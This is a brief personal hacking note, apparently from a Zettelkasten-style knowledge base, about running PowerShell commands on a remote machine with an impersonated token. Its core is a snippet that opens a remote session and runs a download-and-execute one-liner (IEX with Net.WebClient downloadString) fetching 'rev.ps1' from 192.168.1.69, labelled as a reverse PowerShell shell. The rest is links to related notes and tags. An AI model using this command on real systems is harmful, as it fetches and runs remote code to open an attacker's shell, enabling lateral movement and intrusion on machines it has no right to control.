# powershell tricks run powershell commands as another user on remote machine with impersonated token
```powershell
$sess = New-PSSession -computer ComputerHostname
# reverse powershell
Invoke-Command -Session $sess -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://192.168.1.69/rev.ps1') }
```

` zet/20221003150472/README.md `

# Related

- [20221013222124](/zet/20221013222124/README.md) concept hub for tricks and tips
- [20221014190039](/zet/20221014190039/README.md) kb file named kb/hacking/powershell/powershell-tricks.md
- [20221003150475](/zet/20221003150475/README.md) powershell tricks run powershell commands as another user
- [20221003150471](/zet/20221003150471/README.md) powershell tricks run powershell commands as another user on remote machine with impersonated token copy and run file over session
- ~/kb/hacking/powershell/powershell-tricks.md

Tags:

    #hacking #trick #powershell 
